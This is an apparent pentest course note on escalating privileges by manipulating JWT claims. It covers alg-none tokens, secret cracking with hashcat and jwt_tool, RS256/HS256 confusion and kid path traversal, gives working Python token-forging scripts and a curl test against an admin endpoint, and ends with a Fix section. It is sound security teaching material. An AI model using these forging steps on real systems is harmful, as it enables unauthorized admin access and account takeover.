---
tags: [vapt, access-control, jwt, intermediate]
difficulty: intermediate
module: "21 - Access Control"
topic: "21.17 JWT Claim Manipulation for Privilege Escalation"
---

# 21.17 — JWT Claim Manipulation for Privilege Escalation

## JWT as Access Control Mechanism

```
JWTs COMMONLY INCLUDE ROLE/PERMISSION CLAIMS:
  {
    "sub": "42",
    "email": "user@example.com",
    "role": "user",           ← access control claim!
    "is_admin": false,        ← access control claim!
    "permissions": ["read"],  ← access control claim!
    "exp": 1735689600
  }
  
  APP USES THESE FOR AUTHORIZATION:
  if (jwt.role === 'admin'): allow_admin_access()
  if (jwt.is_admin === true): show_admin_panel()
  
  ATTACK: Modify these claims → elevate privileges!
  
  BUT: JWT is SIGNED → normally can't modify without detection
  
  UNLESS:
  - Algorithm = none (see JWT module 04)
  - Weak secret brute-forced (see JWT module 06)
  - HMAC/RSA confusion (see JWT module 05)
  - jwk/jku injection (see JWT modules 07, 08)
```

---

## Attack Scenarios

```
SCENARIO 1: Algorithm None → Modify Role
  Original JWT:
  Header: {"alg":"HS256","typ":"JWT"}
  Payload: {"sub":"42","role":"user","exp":9999999999}
  Signature: VALID_HMAC
  
  Attack:
  Header: {"alg":"none","typ":"JWT"}  ← change algorithm!
  Payload: {"sub":"42","role":"admin","exp":9999999999}  ← change role!
  Signature: (empty)
  
  Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.
          eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.
          (trailing dot, no signature)
  
  If server accepts "none" algorithm → logged in as admin!

SCENARIO 2: Weak Secret → Crack → Forge Role
  Crack: hashcat -a 0 -m 16500 token.txt rockyou.txt
  Secret found: "secret123"
  
  Forge admin token:
  python3 -c "
  import jwt
  token = jwt.encode(
    {'sub': '42', 'role': 'admin', 'is_admin': True, 'exp': 9999999999},
    'secret123',
    algorithm='HS256'
  )
  print(token)
  "
  → Admin token with valid signature!

SCENARIO 3: RS256 → HS256 Confusion
  Find public key from JWKS endpoint or embedded in app
  Sign with HMAC using public key as secret
  role=admin in payload
  → Server verifies with public key as HMAC → valid!

SCENARIO 4: kid Path Traversal → Known Key → Admin Token
  kid: "../../../dev/null" → HMAC key = empty string ""
  Sign with empty string key:
  jwt.encode({"role": "admin"}, "", algorithm="HS256")
  → Valid token with admin role!
```

---

## Testing JWT Claims for Privilege Escalation

```bash
# STEP 1: DECODE YOUR CURRENT JWT:
python3 -c "
import base64, json
token = 'YOUR_JWT_TOKEN'
parts = token.split('.')
# Decode payload (middle part):
payload = parts[1]
padding = '=' * (4 - len(payload) % 4)
decoded = json.loads(base64.b64decode(payload + padding))
print(json.dumps(decoded, indent=2))
"
# → Note: what role/permission claims exist?

# STEP 2: IDENTIFY CLAIMS THAT CONTROL ACCESS:
# Look for: role, is_admin, permissions, scope, tier, level, type

# STEP 3: TRY ALGORITHM NONE:
python3 << 'EOF'
import base64, json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}))
payload = b64url_encode(json.dumps({
    "sub": "42",
    "role": "admin",
    "is_admin": True,
    "exp": 9999999999
}))

# Trailing dot = no signature:
token = f"{header}.{payload}."
print(f"Token: {token}")
EOF

# Submit token → check if admin access granted!

# STEP 4: CHECK IF JWT_TOOL CRACKS THE SECRET:
pip install jwt_tool
python3 jwt_tool.py YOUR_JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt
# -C = crack mode, -d = dictionary

# STEP 5: IF SECRET FOUND → FORGE ADMIN TOKEN:
python3 -c "
import jwt
token = jwt.encode(
    {'sub': '42', 'role': 'admin', 'is_admin': True, 'permissions': ['admin'], 'exp': 9999999999},
    'FOUND_SECRET',
    algorithm='HS256'
)
print(token)
"

# STEP 6: TEST WITH FORGED TOKEN:
curl -H "Authorization: Bearer FORGED_TOKEN" \
  https://api.target.com/admin/users
# → 200? → JWT claim manipulation successful!
```

---

## Specific Claim Targets

```
HIGH-VALUE CLAIMS TO MODIFY:

role:
  "user" → "admin"
  "staff" → "superadmin"
  "customer" → "employee"

is_admin / isAdmin:
  false → true

permissions / scopes:
  ["read"] → ["read", "write", "admin", "delete"]
  ["user:read"] → ["admin:*"]

plan / subscription:
  "free" → "premium"
  "basic" → "enterprise"

account_type:
  "trial" → "paid"

email_verified:
  false → true (bypass verification)

aud (audience) — cross-service attack:
  "service-a" → "service-b"
  → Replay token at different service

exp:
  past timestamp → far future (bypass expiry)

sub:
  "42" → "1" (admin user ID)
```

---

## Fix

```
PREVENTING JWT CLAIM MANIPULATION:

1. NEVER ACCEPT "none" ALGORITHM:
   # PyJWT:
   jwt.decode(token, secret, algorithms=["HS256"])  # whitelist!
   # NOT: algorithms=["HS256", "none"]

2. STRONG SECRET (brute force resistant):
   import secrets
   SECRET_KEY = secrets.token_hex(32)  # 256 bits of entropy

3. VALIDATE ALL SECURITY-RELEVANT CLAIMS:
   payload = jwt.decode(token, secret, algorithms=["HS256"],
       options={
           "require": ["sub", "exp", "iat", "iss", "aud"],
           "verify_exp": True,
           "verify_iss": True,
           "verify_aud": True,
       },
       issuer="https://myapp.com",
       audience="myapp-api"
   )

4. DON'T FULLY TRUST JWT ROLE CLAIMS FOR SENSITIVE OPERATIONS:
   # JWT role → check against DB for critical operations:
   token_role = payload.get('role')
   if token_role == 'admin':
       # Verify against DB (token might be stale):
       user = db.get_user(payload['sub'])
       if user.role != 'admin':
           abort(403)  # role changed since token issued

5. SHORT EXPIRY LIMITS STOLEN TOKEN IMPACT:
   15 minutes for admin tokens
   Role changes take effect at next token refresh

6. KID ALLOWLIST:
   if payload.header['kid'] not in ALLOWED_KIDS:
       abort(401)
```

---

## Related Notes
- [[18 - JWT — Algorithm None Attack]] — algorithm none details
- [[18 - JWT — Weak Secret Brute Force]] — cracking JWT secrets
- [[18 - JWT — RS256 to HS256 Algorithm Confusion]] — algorithm confusion
- [[12 - Parameter Tampering (role=admin, isAdmin=true)]] — non-JWT parameter tampering
- [[20 - Defense — Server-Side Authorization, Object-Level Checks]] — full fix
